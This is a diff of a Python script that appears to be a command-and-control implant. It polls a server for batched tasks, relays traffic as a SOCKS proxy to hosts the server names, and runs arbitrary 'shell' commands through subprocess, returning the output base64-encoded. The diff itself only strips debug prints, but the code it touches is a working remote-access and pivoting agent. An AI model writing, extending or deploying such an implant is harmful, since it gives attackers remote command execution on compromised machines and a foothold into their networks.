@@ -91,27 +91,24 @@ def main(url, key):
         try:
             batch_response = []
             for task in batch_request:
-                print(task)
                 id = task['id']
                 name = task['name']
                 parameters = task['parameters']
                 results = ''
                 parameters = [base64_to_string(parameter) for parameter in parameters]
-                print('help.1')
                 try:
-                    print('help.2')
                     if name == 'check_in':
                         check_in_task_id = id
                         continue
                     if name == 'socks_connect':
                         remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                        #remote.settimeout(5.0)
                         try:
                             remote.connect((parameters[0], int(parameters[1])))
                             rep = 0
                         except socket.timeout:
                             rep = 4
-                        except Exception:
+                        except Exception as e:
+                            print(e)
                             rep = 1
 
                         atype = parameters[2]
@@ -129,23 +126,15 @@ def main(url, key):
                         remote.sendall(upstream_data)
                         results = 'sent succesfully'
                     if name == 'socks_downstream':
-                        print('help.5')
                         remote = proxies[int(parameters[0])]
-                        print('help.6')
                         socks_client_id = parameters[1]
-                        print('help.7')
                         r, w, e = select.select([remote], [], [], 0)
-                        print('help.8')
                         downstream_data = b''
-                        print('bouta read data')
                         if r:
-                            print('readin data')                           
                             downstream_data += remote.recv(4096)
-                            print('read data')                                
                             results = json.dumps({'remote':f'{proxies.index(remote)}','socks_client_id':f'{socks_client_id}','downstream_data':f'{bytes_to_base64(downstream_data)}'})
                     if name == 'shell':
                         results = subprocess.run(parameters, capture_output=True, text=True).stdout
-                    print('help.3')
                     # if not results:
                     #     batch_response.extend([{
                     #         "connectrpc": "0.0.0",
@@ -160,7 +149,6 @@ def main(url, key):
                         "result": string_to_base64(results),
                         "id": id
                     }])
-                    print('help.4')
                     
                 except Exception as e:
                     batch_response.extend([{
